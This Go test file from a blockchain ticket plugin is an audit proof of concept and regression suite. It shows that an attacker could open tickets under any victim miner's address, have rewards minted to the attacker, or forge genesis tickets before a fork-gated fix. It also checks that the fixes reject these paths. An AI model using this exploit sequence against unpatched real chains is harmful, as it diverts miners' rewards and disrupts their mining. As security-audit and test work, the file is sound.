// Copyright Fuzamei Corp. 2018 All Rights Reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

// 本文件是审计项 H-2（TicketOpen 不校验 MinerAddress 归属 -> 向任意矿工注入票据）
// 的可执行 PoC，配合 docs/security/ticket-topen-mineraddress-injection-analysis.md 阅读。
//
// H-2 已由 dapp 分叉 ticket.ForkTicketMinerAuth 修复（见该文档 §8）。testdata 里该分叉
// 配为 0（修复默认生效），因此本文件中演示“注入”的 PoC 用例都显式把
// ForkTicketMinerAuth 配到未来高度（pocCfgBeforeMinerAuth），固定修复前的旧行为；
// 分叉生效后的拒绝路径与放行路径见 ticket_miner_auth_test.go。
//
// 结论概览：
//  1. Test_TicketOpen_InjectsTicketsToArbitraryMiner（分叉前）
//     攻击者用自己的私钥签名，只要 ReturnAddress = 自己，就能把票据挂到任意
//     MinerAddress（受害矿工）名下；票据状态索引 LODB-ticket-tl:<MinerAddress>:1
//     也写在受害矿工名下，因此受害节点的钱包/矿工会把注入票据当成自己的票据。
//  2. Test_InjectedTicket_NotMinableByVictim_PostFork（ForkTicketId 生效、MinerAuth 未生效）
//     ForkTicketId 生效后，ticketId 中的 pubHash 由开票人私钥派生；受害矿工用它
//     自己的私钥算出的 privHash 无法通过 TicketMiner 的校验（ErrCheckPubHash），
//     即注入只能造成“矿工反复挖出废块”的拒绝服务，无法直接盗取该票据奖励。
//  3. Test_TicketGenesisReRunRejected_PostFork / Test_TicketGenesisAllowedAtHeightZero
//     修复后的回归用例：ticket 的 Exec_Genesis 曾经缺少 height != 0 的重入保护
//     （coins/coinsx/token 都有），分叉生效后攻击者仍能造出 IsGenesis=true、3 段
//     ticketId 的“创世票”：既绕过 pubHash 校验，又绕过成熟期与提现等待，让受害矿工
//     立刻替攻击者挖票、奖励增发给攻击者 ReturnAddress。现在由 chain33 框架层
//     （DriverBase.Exec 的 checkGenesisHeight + ForkGenesisOnlyAtHeightZero）拒绝
//     高度 != 0 的 Genesis，同时高度 0 的正常创世路径不受影响。
//  4. Test_InjectedTicket_MinedByVictim_PreFork_RewardGoesToAttacker（分叉前）
//     ForkTicketId 未生效（或旧格式 3 段 ticketId）时，受害矿工可以成功挖出注入
//     票据，而出块奖励（MinerValue）会增发到注入者控制的 ReturnAddress 上。
//  5. Test_TicketOpen_CountExceedsPubHashesRejected
//     同一函数内的相邻缺陷：ForkTicketId 生效后只检查 len(PubHashes)==0，
//     之后按 Count 下标访问 PubHashes，Count > len(PubHashes) 会 panic
//     （被 DriverBase.Exec 的 recover 兜住，返回 ErrActionNotSupport）。
//     该修复不设分叉保护，修复后直接返回 ErrOpenTicketPubHash，本用例改为回归断言。
package executor_test

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"
	"testing"

	"github.com/33cn/chain33/account"
	apimock "github.com/33cn/chain33/client/mocks"
	"github.com/33cn/chain33/common"
	"github.com/33cn/chain33/common/address"
	"github.com/33cn/chain33/common/crypto"
	dbm "github.com/33cn/chain33/common/db"
	"github.com/33cn/chain33/system/dapp"
	"github.com/33cn/chain33/types"
	"github.com/33cn/chain33/util"
	"github.com/golang/protobuf/proto"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"

	ex "github.com/33cn/plugin/plugin/dapp/ticket/executor"
	pty "github.com/33cn/plugin/plugin/dapp/ticket/types"
)

// testdata/chain33.cfg.toml: [fork.sub.ticket] ForkTicketId = 1600000
const (
	pocPostForkHeight = int64(1700000)
	pocPreForkHeight  = int64(100)
	pocBlockTime      = int64(1539918074)
	// pocMinerAuthFuture 是演示“修复前”行为时给 ForkTicketMinerAuth 配置的未来高度
	pocMinerAuthFuture = int64(48100000)
)

type pocEnv struct {
	driver dapp.Driver
	db     dbm.KVDB
	cfg    *types.Chain33Config
	close  func()
}

func newPocEnv(t *testing.T, height int64) *pocEnv {
	return newPocEnvWithCfg(t, mock33.GetAPI().GetConfig(), height)
}

func newPocEnvWithCfg(t *testing.T, cfg *types.Chain33Config, height int64) *pocEnv {
	dir, ldb, kvdb := util.CreateTestDB()
	api := new(apimock.QueueProtocolAPI)
	api.On("GetConfig", mock.Anything).Return(cfg, nil)
	driver, err := dapp.LoadDriver("ticket", height)
	assert.NoError(t, err)
	driver.SetAPI(api)
	driver.SetEnv(height, pocBlockTime, uint64(pocBlockTime))
	driver.SetStateDB(kvdb)
	driver.SetLocalDB(kvdb)
	return &pocEnv{driver: driver, db: kvdb, cfg: cfg, close: func() { util.CloseTestDB(dir, ldb) }}
}

// pocCfgBeforeMinerAuth 返回把 ForkTicketMinerAuth 配到未来高度的配置：
// 用于固定“分叉生效前”的旧行为。testdata 里该分叉为 0，直接用全局配置会走修复后的分支。
func pocCfgBeforeMinerAuth(t *testing.T) *types.Chain33Config {
	data, err := os.ReadFile("testdata/chain33.cfg.toml")
	require.NoError(t, err)
	cfgStr := strings.Replace(string(data), "ForkTicketMinerAuth = 0",
		fmt.Sprintf("ForkTicketMinerAuth = %d", pocMinerAuthFuture), 1)
	require.NotEqual(t, string(data), cfgStr, "testdata 应显式配置 ForkTicketMinerAuth")
	cfg := types.NewChain33Config(cfgStr)
	require.False(t, cfg.IsDappFork(pocPostForkHeight, pty.TicketX, pty.ForkTicketMinerAuth),
		"本用例固定的是 ForkTicketMinerAuth 生效前的行为")
	return cfg
}

// fundCoins 给地址预置 coins 余额，等价于攻击者自己持有买票的本金。
// 真实链上买票的第一步是把币转到 ticket 执行器地址（exec 子账户），
// 这里直接写入 ticket 执行器的 exec 子账户。
func (e *pocEnv) fundCoins(t *testing.T, addr string, amount int64) {
	acc := account.NewCoinsAccount(e.cfg)
	acc.SetDB(e.db)
	acc.SaveExecAccount(address.ExecAddress(pty.TicketX), &types.Account{Addr: addr, Balance: amount, Frozen: 0})
}

// apply 把 Exec/ExecLocal 返回的 KV 落到 DB，模拟真实节点执行+写本地库
func (e *pocEnv) apply(t *testing.T, kvs []*types.KeyValue) {
	for _, kv := range kvs {
		if len(kv.Value) > 0 {
			assert.NoError(t, e.db.Set(kv.Key, kv.Value))
		}
	}
}

func pocAddress(priv crypto.PrivKey) string {
	return address.PubKeyToAddr(address.DefaultID, priv.PubKey().Bytes())
}

func createTicketTx(t *testing.T, action string, payload proto.Message, priv crypto.PrivKey) *types.Transaction {
	cfg := mock33.GetAPI().GetConfig()
	ety := types.LoadExecutorType("ticket")
	tx, err := ety.Create(action, payload)
	assert.NoError(t, err)
	tx, err = types.FormatTx(cfg, "ticket", tx)
	assert.NoError(t, err)
	tx.Sign(types.SECP256K1, priv)
	return tx
}

func ticketIDsFromLogs(t *testing.T, receipt *types.Receipt) (ids []string) {
	for _, l := range receipt.Logs {
		if l.Ty != pty.TyLogNewTicket {
			continue
		}
		var rt pty.ReceiptTicket
		assert.NoError(t, types.Decode(l.Log, &rt))
		ids = append(ids, rt.TicketId)
	}
	return ids
}

// openInjectedTicket 由攻击者签名开票：MinerAddress=受害矿工，ReturnAddress=攻击者自己。
// withPubHash 对应 ForkTicketId 是否生效。env 必须使用“ForkTicketMinerAuth 尚未生效”的配置，
// 否则修复后的归属校验会先返回 ErrMinerAddr（见 ticket_miner_auth_test.go）。
func openInjectedTicket(t *testing.T, env *pocEnv, height int64, attackerPriv, victimPriv crypto.PrivKey, count int32, withPubHash bool) (ids []string, tx *types.Transaction, receipt *types.Receipt, seed int64) {
	cfg := env.cfg
	require.False(t, cfg.IsDappFork(height, pty.TicketX, pty.ForkTicketMinerAuth),
		"本 PoC 固定的是 ForkTicketMinerAuth 生效前的行为")
	attackerAddr := pocAddress(attackerPriv)
	victimAddr := pocAddress(victimPriv)
	price := pty.GetTicketMinerParam(cfg, height).TicketPrice
	env.fundCoins(t, attackerAddr, int64(count+1)*price)

	seed = 1234567
	var pubHashes [][]byte
	if withPubHash {
		// 注入者用自己的私钥派生 pubHash；受害矿工不知道这个私钥
		pubHashes = make([][]byte, count)
		for i := 0; i < int(count); i++ {
			privHash := common.Sha256([]byte(fmt.Sprintf("%x:%d:%d", attackerPriv.Bytes(), i, seed)))
			pubHashes[i] = common.Sha256(privHash)
		}
	}
	topen := &pty.TicketOpen{
		MinerAddress:  victimAddr,
		ReturnAddress: attackerAddr,
		Count:         count,
		RandSeed:      seed,
		PubHashes:     pubHashes,
	}
	tx = createTicketTx(t, "Topen", topen, attackerPriv)
	// 关键点：签名者只是攻击者自己，TicketOpen 不校验它的 MinerAddress 归属
	assert.Equal(t, attackerAddr, tx.From())

	receipt, err := env.driver.Exec(tx, 0)
	if err != nil || receipt == nil {
		t.Fatalf("TicketOpen exec failed: %v", err)
	}
	assert.Equal(t, int32(types.ExecOk), receipt.Ty)

	ids = ticketIDsFromLogs(t, receipt)
	assert.Len(t, ids, int(count))
	for _, id := range ids {
		// 票据状态对象写入 mavl-ticket-<id>，MinerAddress 是受害矿工
		var tk pty.Ticket
		var found bool
		for _, kv := range receipt.KV {
			if string(kv.Key) == string(ex.Key(id)) {
				assert.NoError(t, types.Decode(kv.Value, &tk))
				found = true
			}
		}
		assert.True(t, found, "ticket %s should be written into state", id)
		assert.Equal(t, victimAddr, tk.MinerAddress)
		assert.Equal(t, attackerAddr, tk.ReturnAddress)
		assert.True(t, strings.HasPrefix(id, victimAddr+":"), "ticketId 前缀是受害矿工的 MinerAddress: %s", id)
	}
	env.apply(t, receipt.KV)
	return ids, tx, receipt, seed
}

// Test_TicketOpen_InjectsTicketsToArbitraryMiner 证明“向任意矿工注入票据”在修复前可以实现：
// 攻击者不持有受害矿工私钥，也能让受害矿工地址名下出现票据，且官方 TicketList 查询
// 会把这些票据返回给受害地址。修复（ForkTicketMinerAuth）生效后该路径返回 ErrMinerAddr，
// 回归见 Test_TicketOpen_RejectsForeignMinerAddress。
func Test_TicketOpen_InjectsTicketsToArbitraryMiner(t *testing.T) {
	attackerPriv, err := FromPrivkey(PrivKeyA)
	assert.NoError(t, err)
	victimPriv, err := FromPrivkey(PrivKeyB)
	assert.NoError(t, err)
	attackerAddr, victimAddr := pocAddress(attackerPriv), pocAddress(victimPriv)

	// 固定修复前的旧行为：把 ForkTicketMinerAuth 配到未来高度
	env := newPocEnvWithCfg(t, pocCfgBeforeMinerAuth(t), pocPostForkHeight)
	defer env.close()

	const count = int32(3)
	ids, tx, receipt, _ := openInjectedTicket(t, env, pocPostForkHeight, attackerPriv, victimPriv, count, true)

	// 本地索引 LODB-ticket-tl:<MinerAddress>:<status>:<ticketId> 使用的是 MinerAddress，
	// 受害矿工的节点会把这些票据当成自己的票据（wallet.getTicketsByStatus/Query_TicketList）
	lset, err := env.driver.ExecLocal(tx, &types.ReceiptData{Ty: receipt.Ty, Logs: receipt.Logs}, 0)
	assert.NoError(t, err)
	indexed := make(map[string]bool)
	for _, kv := range lset.KV {
		indexed[string(kv.Key)] = len(kv.Value) > 0
	}
	for _, id := range ids {
		key := fmt.Sprintf("LODB-ticket-tl:%s:%d:%s", address.FormatAddrKey(victimAddr), pty.TicketOpened, id)
		assert.True(t, indexed[key], "票据必须以受害矿工地址建立索引: %s", key)
	}
	env.apply(t, lset.KV)

	// 用官方查询路径确认：受害矿工地址名下凭空多出了票据
	msg, err := ex.List(env.db, env.db, &pty.TicketList{Addr: victimAddr, Status: pty.TicketOpened})
	assert.NoError(t, err)
	listed := msg.(*pty.ReplyTicketList).GetTickets()
	assert.Len(t, listed, int(count))
	for _, tk := range listed {
		assert.Equal(t, victimAddr, tk.MinerAddress)
		assert.Equal(t, attackerAddr, tk.ReturnAddress)
	}
	t.Logf("injected %d tickets, victim=%s attacker=%s", len(listed), victimAddr, attackerAddr)
}

// Test_InjectedTicket_NotMinableByVictim_PostFork：ForkTicketId 生效（而 ForkTicketMinerAuth
// 尚未生效，即 v1.76.x 现网状态）时，pubHash 把票据绑到开票人私钥，受害矿工无法挖出注入
// 票据（只能造成废块/拒绝服务）。
func Test_InjectedTicket_NotMinableByVictim_PostFork(t *testing.T) {
	cfg := pocCfgBeforeMinerAuth(t)
	attackerPriv, err := FromPrivkey(PrivKeyA)
	assert.NoError(t, err)
	victimPriv, err := FromPrivkey(PrivKeyB)
	assert.NoError(t, err)
	attackerAddr, victimAddr := pocAddress(attackerPriv), pocAddress(victimPriv)

	env := newPocEnvWithCfg(t, cfg, pocPostForkHeight)
	defer env.close()

	ids, _, _, seed := openInjectedTicket(t, env, pocPostForkHeight, attackerPriv, victimPriv, 1, true)
	id := ids[0]
	parts := strings.Split(id, ":")
	assert.Len(t, parts, 5, "ForkTicketId 生效后 ticketId 形如 miner:txhash:index:pubHash:seed")
	countNum, err := strconv.Atoi(parts[2])
	assert.NoError(t, err)

	params := pty.GetTicketMinerParam(cfg, pocPostForkHeight)
	reward := params.CoinReward

	// 受害矿工的共识节点会用“自己的私钥”派生 privHash（consensus/ticket.genPrivHash）
	victimPrivHash := common.Sha256([]byte(fmt.Sprintf("%x:%d:%s", victimPriv.Bytes(), countNum, parts[4])))
	assert.NotEqual(t, parts[3], hex.EncodeToString(common.Sha256(victimPrivHash)),
		"受害矿工算出的 privHash 必然对不上注入者写入的 pubHash")
	// 注入者的 privHash 才能对上
	attackerPrivHash := common.Sha256([]byte(fmt.Sprintf("%x:%d:%d", attackerPriv.Bytes(), countNum, seed)))
	assert.Equal(t, parts[3], hex.EncodeToString(common.Sha256(attackerPrivHash)))

	// 让票据过冻结期
	env.driver.SetEnv(pocPostForkHeight, pocBlockTime+params.TicketFrozenTime+1, uint64(pocBlockTime))
	victimMinerTx := createTicketTx(t, "Miner", &pty.TicketMiner{TicketId: id, Reward: reward, PrivHash: victimPrivHash}, victimPriv)
	assert.Equal(t, victimAddr, victimMinerTx.From())
	_, err = env.driver.Exec(victimMinerTx, 0)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "ErrCheckPubHash")

	// 只有知道 pubHash 原像（注入者自己的私钥）的人能挖，且只能以 ReturnAddress 身份挖
	attackerMinerTx := createTicketTx(t, "Miner", &pty.TicketMiner{TicketId: id, Reward: reward, PrivHash: attackerPrivHash}, attackerPriv)
	assert.Equal(t, attackerAddr, attackerMinerTx.From())
	mined, err := env.driver.Exec(attackerMinerTx, 0)
	if err != nil || mined == nil {
		t.Fatalf("injector self-mining failed: %v", err)
	}
	assert.Equal(t, int32(types.ExecOk), mined.Ty)
}

// Test_InjectedTicket_MinedByVictim_PreFork_RewardGoesToAttacker：
// ForkTicketId 未生效（旧格式 3 段 ticketId）时，受害矿工能挖出注入票据，
// 而出块奖励增发到注入者的 ReturnAddress。
func Test_InjectedTicket_MinedByVictim_PreFork_RewardGoesToAttacker(t *testing.T) {
	cfg := pocCfgBeforeMinerAuth(t)
	attackerPriv, err := FromPrivkey(PrivKeyA)
	assert.NoError(t, err)
	victimPriv, err := FromPrivkey(PrivKeyB)
	assert.NoError(t, err)
	attackerAddr, victimAddr := pocAddress(attackerPriv), pocAddress(victimPriv)

	env := newPocEnvWithCfg(t, cfg, pocPreForkHeight)
	defer env.close()

	ids, _, _, _ := openInjectedTicket(t, env, pocPreForkHeight, attackerPriv, victimPriv, 1, false)
	id := ids[0]
	assert.Len(t, strings.Split(id, ":"), 3, "ForkTicketId 未生效时 ticketId 只有 3 段")

	params := pty.GetTicketMinerParam(cfg, pocPreForkHeight)
	reward := params.CoinReward

	// 受害矿工的节点正常挖矿（旧格式没有 privHash 校验），挖的是“别人挂在自己名下的票”
	env.driver.SetEnv(pocPreForkHeight, pocBlockTime+params.TicketFrozenTime+1, uint64(pocBlockTime))
	minerTx := createTicketTx(t, "Miner", &pty.TicketMiner{TicketId: id, Reward: reward}, victimPriv)
	assert.Equal(t, victimAddr, minerTx.From())
	receipt, err := env.driver.Exec(minerTx, 0)
	if err != nil || receipt == nil {
		t.Fatalf("victim mining injected ticket failed: %v", err)
	}
	assert.Equal(t, int32(types.ExecOk), receipt.Ty)

	// 出块奖励（MinerValue）被增发并冻结到票据的 ReturnAddress —— 也就是攻击者地址。
	// 注意开票时已冻结了票面价，这里比较冻结余额的增量。
	var credited string
	var minted int64
	for _, l := range receipt.Logs {
		if l.Ty != types.TyLogExecDeposit {
			continue
		}
		var transfer types.ReceiptExecAccountTransfer
		if err := types.Decode(l.Log, &transfer); err != nil {
			continue
		}
		if transfer.GetCurrent().GetAddr() == attackerAddr {
			credited = transfer.GetCurrent().GetAddr()
			minted = transfer.GetCurrent().GetFrozen() - transfer.GetPrev().GetFrozen()
		}
	}
	assert.Equal(t, attackerAddr, credited, "出块奖励必须记在攻击者的 ReturnAddress 上")
	assert.Equal(t, reward, minted)
	t.Logf("victim %s mined injected ticket, reward %d credited to attacker %s", victimAddr, minted, attackerAddr)
}

// Test_TicketGenesisReRunRejected_PostFork：修复后的回归用例。
// Genesis 只允许在高度 0 执行，由 chain33 框架层统一拦截：DriverBase.Exec 的
// checkGenesisHeight 配合系统分叉 ForkGenesisOnlyAtHeightZero（本仓库各配置取 0，
// 默认配置 title=local 亦全为 0），因此 ForkTicketId 生效后也无法再造出“免检”
// 的创世票，攻击链在第一步就被挡住。
//
// 注意：ticket 执行器自身**不再**重复该校验，本用例完全依赖该分叉生效，
// 因此先把这一前提断言出来 —— 分叉若被配成 -1(→MaxHeight) 或链接旧 chain33，用例会直接变红。
func Test_TicketGenesisReRunRejected_PostFork(t *testing.T) {
	cfg := mock33.GetAPI().GetConfig()
	height := pocPostForkHeight
	assert.True(t, cfg.IsDappFork(height, pty.TicketX, "ForkTicketId"), "本用例要求 ForkTicketId 已生效")
	require.True(t, cfg.IsFork(height, types.ForkGenesisOnlyAtHeightZero),
		"本用例依赖框架层分叉 %s 在高度 %d 已生效", types.ForkGenesisOnlyAtHeightZero, height)

	attackerPriv, err := FromPrivkey(PrivKeyA)
	assert.NoError(t, err)
	victimPriv, err := FromPrivkey(PrivKeyB)
	assert.NoError(t, err)
	attackerAddr, victimAddr := pocAddress(attackerPriv), pocAddress(victimPriv)

	env := newPocEnv(t, height)
	defer env.close()

	price := pty.GetTicketMinerParam(cfg, height).TicketPrice
	env.fundCoins(t, attackerAddr, 4*price)

	// 攻击者伪造“创世票”：MinerAddress = 受害矿工，ReturnAddress = 自己
	genesisTx := createTicketTx(t, "Genesis", &pty.TicketGenesis{
		MinerAddress:  victimAddr,
		ReturnAddress: attackerAddr,
		Count:         1,
	}, attackerPriv)
	receipt, err := env.driver.Exec(genesisTx, 0)
	assert.Equal(t, types.ErrReRunGenesis, err, "高度 %d 上的 Exec_Genesis 必须被框架层拒绝", height)
	assert.Nil(t, receipt, "被拒绝时不得产生回执与状态写入")
	t.Logf("post-fork(height=%d) genesis re-run rejected by framework fork: %v", height, err)
}

// Test_TicketGenesisAllowedAtHeightZero：创世高度（0）上的正常路径不受修复影响。
func Test_TicketGenesisAllowedAtHeightZero(t *testing.T) {
	cfg := mock33.GetAPI().GetConfig()
	attackerPriv, err := FromPrivkey(PrivKeyA)
	assert.NoError(t, err)
	attackerAddr := pocAddress(attackerPriv)

	env := newPocEnv(t, 0)
	defer env.close()

	price := pty.GetTicketMinerParam(cfg, 0).TicketPrice
	env.fundCoins(t, attackerAddr, 4*price)

	genesisTx := createTicketTx(t, "Genesis", &pty.TicketGenesis{
		MinerAddress:  attackerAddr,
		ReturnAddress: attackerAddr,
		Count:         1,
	}, attackerPriv)
	receipt, err := env.driver.Exec(genesisTx, 0)
	assert.NoError(t, err)
	assert.NotNil(t, receipt)
	assert.Equal(t, int32(types.ExecOk), receipt.Ty)
	assert.Len(t, ticketIDsFromLogs(t, receipt), 1)
}

// Test_TicketOpen_CountExceedsPubHashesRejected：同一函数内的相邻缺陷（修复后的回归用例）。
// ForkTicketId 生效时只拒绝 len(PubHashes)==0，却按 Count 下标取值，Count > len(PubHashes)
// 曾直接 panic（被 DriverBase.Exec 的 recover 兜成 ErrActionNotSupport）；修复后按 Count
// 校验，直接返回 ErrOpenTicketPubHash。该修复不设分叉保护：panic 交易会被 PreExecBlock
// 从区块中丢弃，从未写入任何区块，因此不影响历史区块重放。
func Test_TicketOpen_CountExceedsPubHashesRejected(t *testing.T) {
	attackerPriv, err := FromPrivkey(PrivKeyA)
	require.NoError(t, err)

	env := newPocEnv(t, pocPostForkHeight)
	defer env.close()

	attackerAddr := pocAddress(attackerPriv)
	cfg := env.cfg
	require.True(t, cfg.IsDappFork(pocPostForkHeight, pty.TicketX, "ForkTicketId"),
		"本用例要求 ForkTicketId 已生效")
	price := pty.GetTicketMinerParam(cfg, pocPostForkHeight).TicketPrice
	env.fundCoins(t, attackerAddr, 2000*price)

	// MinerAddress 用签名者自己，先通过归属校验，单独暴露 PubHashes 长度校验
	topen := &pty.TicketOpen{
		MinerAddress:  attackerAddr,
		ReturnAddress: attackerAddr,
		Count:         1000,
		RandSeed:      1,
		PubHashes:     [][]byte{[]byte("only-one-pubhash")},
	}
	tx := createTicketTx(t, "Topen", topen, attackerPriv)

	ticket, ok := env.driver.(*ex.Ticket)
	require.True(t, ok)
	action := ex.NewAction(ticket, tx)

	// 修复后不得再 panic
	var recovered interface{}
	var openErr error
	func() {
		defer func() { recovered = recover() }()
		_, openErr = action.TicketOpen(topen)
	}()
	assert.Nil(t, recovered, "修复后 Count(1000) > len(PubHashes)(1) 不得再 panic")
	assert.Equal(t, pty.ErrOpenTicketPubHash, openErr)

	// 链上执行路径（DriverBase.Exec）同样返回 ErrOpenTicketPubHash，而不是 ErrActionNotSupport
	_, err = env.driver.Exec(tx, 0)
	assert.Equal(t, pty.ErrOpenTicketPubHash, err)
}
